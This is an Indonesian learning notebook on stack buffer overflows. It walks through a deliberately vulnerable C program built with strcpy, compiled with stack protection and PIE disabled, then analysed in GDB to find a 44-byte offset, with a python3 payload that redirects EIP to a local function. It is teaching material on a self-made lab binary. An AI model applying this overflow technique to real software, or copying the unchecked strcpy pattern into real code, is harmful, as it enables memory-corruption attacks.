# Buffer Overflow — Catatan Belajar

> Bagian dari perjalanan belajar C untuk Cybersecurity (Exploit Development / Security Researcher)

---

## Sesi 8 — Buffer Overflow Konsep (Windows)

### Program Vulnerable

```c
#include <stdio.h>
#include <string.h>

void rahasia() {
    printf("BERHASIL! Kamu mencapai function rahasia!\n");
}

void vulnerable(char *input) {
    char buffer[16];
    strcpy(buffer, input);  // tidak ada pengecekan panjang!
    printf("Input: %s\n", buffer);
}

int main() {
    printf("Alamat function rahasia: %p\n", rahasia);
    vulnerable("AAAA");
    printf("Program selesai normal.\n");
    return 0;
}
```

### Yang Terbukti

- `strcpy` tidak mengecek panjang input
- Input 4 byte → program normal
- Input 36 byte → program crash (segmentation fault)
- Crash terjadi karena return address tertimpa nilai tidak valid (`0x4141414141414141`)

### Kenapa Crash

```
buffer tertimpa 'AAAA...'
       ↓
return address = 0x4141414141414141
       ↓
CPU mencoba pergi ke alamat itu
       ↓
alamat tidak valid → ACCESS VIOLATION → crash
```

### Catatan: Windows vs Linux

Buffer overflow klasik lebih sulit di Windows karena:
- ASLR aktif — alamat memory berubah setiap run
- Proteksi tambahan dari MinGW compiler
- Arsitektur 64-bit lebih kompleks

---

## Sesi 9 — Buffer Overflow Praktik (Linux / Kali)

### Setup Environment

```bash
# Install GDB
sudo apt install gdb -y

# Install library 32-bit
sudo apt install gcc-multilib -y
```

### Program Vulnerable

```c
#include <stdio.h>
#include <string.h>

void rahasia() {
    printf("BERHASIL! Kamu mengendalikan eksekusi!\n");
}

void vulnerable(char *input) {
    char buffer[32];
    strcpy(buffer, input);
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    printf("Alamat rahasia: %p\n", rahasia);
    if (argc > 1) {
        vulnerable(argv[1]);
    } else {
        vulnerable("AAAA");
    }
    printf("Program selesai normal.\n");
    return 0;
}
```

### Compile

```bash
gcc bof.c -o bof -fno-stack-protector -no-pie -m32
```

| Flag | Fungsi |
|------|--------|
| `-fno-stack-protector` | Matikan proteksi stack bawaan gcc |
| `-no-pie` | Alamat memory tetap sama setiap run |
| `-m32` | Compile sebagai 32-bit |

### Langkah 1 — Konfirmasi Overflow

```bash
./bof $(python3 -c "print('A'*50)")
```

Output:
```
Alamat rahasia: 0x8049186
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault
```

### Langkah 2 — Analisis dengan GDB

```bash
gdb ./bof
```

```gdb
run $(python3 -c "print('A'*50)")
```

Output:
```
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

```gdb
info registers eip
```

Output:
```
eip  0x41414141  0x41414141
```

**EIP berisi `0x41414141` — artinya return address sudah tertimpa huruf 'A'.**

### Langkah 3 — Cari Offset

Kirim pola berbeda untuk tahu di byte keberapa EIP tertimpa:

```gdb
run $(python3 -c "print('A'*32 + 'B'*4 + 'C'*4 + 'D'*4 + 'E'*4)")
```

Output:
```
EIP = 0x45454545  ← 'EEEE'
```

Artinya:
```
byte  1-32  → buffer (A)
byte 33-36  → BBBB
byte 37-40  → CCCC
byte 41-44  → DDDD
byte 45-48  → EEEE  ← EIP di sini

Offset = 44 byte
```

### Langkah 4 — Buat Payload

**Little Endian** — CPU x86 menyimpan angka dengan byte terkecil duluan:

```
0x08049186  →  \x86\x91\x04\x08  (urutan di memory)
```

Buat payload:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 + b'\x86\x91\x04\x08')" > payload.bin
```

### Langkah 5 — Jalankan Exploit

```bash
./bof $(cat payload.bin)
```

Output:
```
Alamat rahasia: 0x8049186
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..
BERHASIL! Kamu mengendalikan eksekusi!
zsh: segmentation fault
```

**Exploit berhasil. CPU melompat ke `rahasia()` tanpa dipanggil secara langsung.**

### Visualisasi Stack

```
byte  1-32  │ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA │ ← buffer[32]
byte 33-44  │ AAAAAAAAAAAA                       │ ← saved registers + EBP
byte 45-48  │ \x86\x91\x04\x08                  │ ← return address ← kita kontrol!
                          ↓
              CPU baca return address = 0x8049186
                          ↓
              CPU melompat ke rahasia()
```

### Kenapa Segfault Setelah BERHASIL?

Setelah `rahasia()` selesai, CPU mencoba membaca return address `rahasia()` — tapi kita tidak mengaturnya. Crash setelah exploit berhasil adalah hal yang normal untuk exploit sederhana.

---

## Konsep Penting

### EIP (Instruction Pointer)

Register yang menyimpan alamat instruksi berikutnya yang akan dijalankan CPU. Ketika function selesai, CPU membaca return address dari stack dan menaruhnya ke EIP.

```
Normal   : EIP = alamat yang benar → program lanjut
Overflow : EIP = 0x41414141        → crash
Exploit  : EIP = 0x8049186         → lompat ke rahasia()
```

### Masalah Encoding

`struct.pack` + `.decode('latin1')` gagal karena terminal mengubah bytes dengan UTF-8 di tengah jalan. Solusinya: tulis bytes mentah langsung ke file binary.

```python
# GAGAL — encoding rusak di terminal
struct.pack('<I', 0x8049186).decode('latin1')

# BERHASIL — bytes mentah ke file
sys.stdout.buffer.write(b'\x86\x91\x04\x08')
```

---

## Tools yang Dipakai

| Tool | Fungsi |
|------|--------|
| `gcc` | Compiler C |
| `gdb` | Debugger — analisis register dan memory |
| `python3` | Buat payload |

---

## Selanjutnya

- [ ] pwntools — cara profesional membuat exploit dengan Python
- [ ] CTF pertama — picoCTF
- [ ] Bypass proteksi modern — ASLR, NX, stack canary
